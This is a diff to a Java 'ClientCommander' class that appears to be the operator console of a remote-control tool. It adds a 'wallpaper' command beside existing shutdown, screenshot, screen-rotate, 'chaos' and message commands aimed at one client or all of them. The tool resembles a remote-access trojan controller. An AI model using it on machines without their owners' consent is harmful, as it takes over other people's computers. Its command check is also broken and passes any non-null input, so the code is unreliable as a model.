@@ -69,7 +69,7 @@ public class ClientCommander implements Runnable
     private boolean commandValid(String command)
     {
         command = command.toLowerCase();
-        return command != null || command.equals(CMD_ROTATE) || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
+        return command != null || command.equals(CMD_WALLPAPER) || command.equals(CMD_ROTATE) || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
     }
 
     /**
@@ -101,7 +101,7 @@ public class ClientCommander implements Runnable
     private void printHelp(String command)
     {
         if(command == null) // user wants full help
-            System.out.println("Usage:\n\t" + CMD_COUNT + "\n\t" + CMD_ONLINE + "\n\t" + CMD_HELP + "\n\t" + CMD_SYSINFO + " HOST\n\t" + CMD_EJECT + " HOST\n\t" + CMD_SHUTDOWN + " HOST\n\t" + CMD_RESTART + " HOST\n\t" + CMD_SCREENSHOT + " HOST\n\t" + CMD_SOUND + " HOST /path/to/local/sound/file\n\t" + CMD_ROTATE + " HOST ORIENTATION\n\t" + CMD_MSG + " \"message body\" \"message box title\" type\n\t" + CMD_CHAOS + " HOST DURATION DELAY\n\t" + CMD_TYPE + " HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
+            System.out.println("Usage:\n\t" + CMD_COUNT + "\n\t" + CMD_ONLINE + "\n\t" + CMD_HELP + "\n\t" + CMD_SYSINFO + " HOST\n\t" + CMD_EJECT + " HOST\n\t" + CMD_SHUTDOWN + " HOST\n\t" + CMD_RESTART + " HOST\n\t" + CMD_SCREENSHOT + " HOST\n\t" + CMD_SOUND + " HOST /path/to/local/sound/file\n\t" + CMD_WALLPAPER + " HOST /path/to/local/image/file\n\t" + CMD_ROTATE + " HOST ORIENTATION\n\t" + CMD_MSG + " \"message body\" \"message box title\" type\n\t" + CMD_CHAOS + " HOST DURATION DELAY\n\t" + CMD_TYPE + " HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
         else
         {
             if(command.equals(CMD_COUNT))
@@ -130,6 +130,8 @@ public class ClientCommander implements Runnable
                 System.out.println(CMD_SYSINFO + " will return the client's operating system.\nExample usage:\n\t" + CMD_SYSINFO + " 127.0.0.1");
             else if(command.equals(CMD_ROTATE))
                 System.out.println(CMD_ROTATE + " will rotate the clients screen depending on the supplied rotation.\nExample usage:\n\t" + CMD_ROTATE + " 127.0.0.1 ORIENTATION\nORIENTATION can be either: left, right, up, down");
+            else if(command.equals(CMD_WALLPAPER))
+                System.out.println(CMD_WALLPAPER + " will change the clients desktop wallpaper image.\nExample usage:\n\t" + CMD_WALLPAPER + " 127.0.0.1 /path/to/local/image/file");
         }
     }
 
@@ -199,7 +201,7 @@ public class ClientCommander implements Runnable
             return;
         }
 
-        // Two argument commands: sound, type, rotate
+        // Two argument commands: sound, type, rotate, wallpaper
         // e.g. sound 127.0.0.1 /path/to/sound/file
         String argument = null;
         if(commandTokens.size() == 3)
@@ -227,6 +229,14 @@ public class ClientCommander implements Runnable
                     sendCommandAll(argument);
                 else
                     target.sendCommandPart(argument);
+            }
+            else if(command.equals(CMD_WALLPAPER))
+            {
+                File wallpaper = new File(argument);
+                if(host.equals(HOST_ALL))
+                    sendFileAll(wallpaper, (int)wallpaper.length());
+                else
+                    target.sendFile(wallpaper, (int)wallpaper.length());
             }
         }
 
